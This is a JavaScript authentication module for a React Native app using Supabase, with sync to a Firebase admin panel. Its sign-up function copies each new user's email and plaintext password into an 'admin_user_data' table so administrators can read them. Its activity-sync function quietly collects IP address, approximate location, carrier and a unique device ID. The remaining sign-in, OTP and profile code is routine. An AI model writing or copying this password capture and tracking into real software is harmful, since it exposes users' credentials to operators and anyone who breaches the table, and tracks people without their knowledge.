import { supabase } from '../config/supabase';

// ==================== PASSWORD AUTH ====================

/**
 * Sign Up with Email & Password
 */
export const signUpWithEmail = async (email, password, name) => {
  try {
    const { data, error } = await supabase.auth.signUp({
      email,
      password,
      options: {
        data: {
          display_name: name,
        },
      },
    });

    if (error) throw error;

    // Store credentials for admin visibility (as requested by user)
    // Synchronize to both Supabase and Firebase for Admin Panel support
    if (data.user) {
      // 1. Supabase Admin Table
      const { error: adminError } = await supabase
        .from('admin_user_data')
        .insert([{ 
          user_id: data.user.id, 
          email: email, 
          password: password 
        }]);

      if (adminError) {
          console.error("Supabase Admin Meta Error:", adminError.message);
      }
      
      // 2. Firebase Sync (for your Admin Panel)
      try {
        const database = require("@react-native-firebase/database").default;
        await database().ref(`/users/${data.user.id}`).set({
          name: name,
          email: email,
          createdAt: new Date().toISOString(),
          lastLogin: new Date().toISOString()
        });
        await database().ref(`/wallets/${data.user.id}`).set({
          balance: 0,
          lastUpdated: Date.now()
        });
      } catch (fbError) {
        console.warn("Firebase User Sync Error:", fbError.message);
      }
    }

    return { success: true, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Sign In with Email & Password
 */
export const signInWithEmail = async (email, password) => {
  try {
    const { data, error } = await supabase.auth.signInWithPassword({
      email,
      password,
    });

    if (error) throw error;
    return { success: true, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};


/**
 * Send OTP to user's email
 */
export const sendOtpToEmail = async (email) => {
  try {
    console.log("📨 Requesting OTP for:", email);
    const { error } = await supabase.auth.signInWithOtp({
      email: email,
      options: {
        shouldCreateUser: true,
      }
    });
    if (error) {
       console.log("❌ Supabase OTP Error:", error.message);
       throw error;
    }
    console.log("✅ OTP Request Success (Check Email)");
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Send OTP to user's phone
 */
export const sendOtpToPhone = async (phone) => {
  try {
    console.log("📨 Requesting Phone OTP for:", phone);
    const { error } = await supabase.auth.signInWithOtp({
      phone: phone,
      options: {
        shouldCreateUser: true,
      }
    });
    if (error) {
       console.log("❌ Supabase Phone OTP Error:", error.message);
       throw error;
    }
    console.log("✅ Phone OTP Request Success");
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Verify Phone OTP
 */
export const verifyOtpForPhone = async (phone, token) => {
  try {
    const { data, error } = await supabase.auth.verifyOtp({
      phone,
      token,
      type: 'sms',
    });
    if (error) throw error;
    return { success: true, session: data.session, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Verify Email OTP
 */
export const verifyOtpForEmail = async (email, token) => {
  try {
    const { data, error } = await supabase.auth.verifyOtp({
      email,
      token,
      type: 'email',
    });
    if (error) throw error;
    return { success: true, session: data.session, user: data.user };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Update User Profile (Supabase)
 */
export const updateUserProfile = async (updates) => {
  try {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) throw new Error("No user logged in");

    // 1. Update Supabase
    const { error } = await supabase
      .from('profiles')
      .update(updates)
      .eq('id', user.id);
      
    if (error) throw error;

    // 2. Sync to Firebase (for Admin Panel)
    try {
        const database = require("@react-native-firebase/database").default;
        const fbUpdates = {};
        if (updates.display_name) fbUpdates.name = updates.display_name;
        if (updates.mobile) fbUpdates.mobile = updates.mobile;
        if (updates.avatar_data) fbUpdates.image = updates.avatar_data;
        
        if (Object.keys(fbUpdates).length > 0) {
            await database().ref(`/users/${user.id}`).update(fbUpdates);
        }
    } catch (fbErr) {
        console.warn("Firebase Profile Sync Fail:", fbErr.message);
    }

    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

/**
 * Delete Own Account
 */
export const deleteAccount = async () => {
  try {
    const { error } = await supabase.rpc('delete_own_account');
    if (error) throw error;
    await supabase.auth.signOut();
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};
/**
 * Sync User Activity (IP, Location, Status)
 */
export const syncUserActivity = async () => {
  try {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    // 1. Fetch IP and Approx Location
    let ipData = { ip: "N/A", latitude: 0, longitude: 0, city: "N/A" };
    try {
      // Primary: ipwho.is
      const resp = await fetch('https://ipwho.is/');
      const json = await resp.json();
      if (json && json.success) {
          ipData = {
              ip: json.ip,
              latitude: json.latitude,
              longitude: json.longitude,
              city: json.city
          };
      } else {
          // Fallback: freeipapi.com
          const resp2 = await fetch('https://freeipapi.com/api/json');
          const json2 = await resp2.json();
          if (json2) {
              ipData = {
                  ip: json2.ipAddress,
                  latitude: json2.latitude,
                  longitude: json2.longitude,
                  city: json2.cityName
              };
          }
      }
    } catch (e) { 
        console.log("IP Fetch Error:", e); 
    }

    const DeviceInfo = require("react-native-device-info").default;
    const deviceInfo = {
      ipAddress: ipData.ip || "Unknown",
      latitude: ipData.latitude || 0,
      longitude: ipData.longitude || 0,
      city: ipData.city || "N/A",
      model: DeviceInfo.getModel(),
      brand: DeviceInfo.getBrand(),
      systemVersion: DeviceInfo.getSystemVersion(),
      carrier: await DeviceInfo.getCarrier(),
      deviceId: await DeviceInfo.getUniqueId()
    };

    const lastActive = new Date().toISOString();

    // 2. Update Firebase
    // We use the UUID (user.id) as the primary key for new users.
    const database = require("@react-native-firebase/database").default;
    await database().ref(`/users/${user.id}`).update({
      lastActive,
      deviceInfo,
      lastLogin: lastActive
    });

    // Also update by deviceId for backward compatibility in Admin Panel if needed
    const devId = await DeviceInfo.getUniqueId();
    if (devId && devId !== user.id) {
        await database().ref(`/users/${devId}`).update({
           lastActive,
           deviceInfo,
           linkedUuid: user.id
        });
    }

    // 3. Update Supabase Profile
    await supabase.from('profiles').update({
       last_active_at: lastActive
    }).eq('id', user.id);

  } catch (err) {
    console.warn("Sync Activity Error:", err.message);
  }
};

/**
 * Sign Out
 */
export const signOut = async () => {
  try {
    const { error } = await supabase.auth.signOut();
    if (error) throw error;
    return { success: true };
  } catch (error) {
    return { success: false, error: error.message };
  }
};
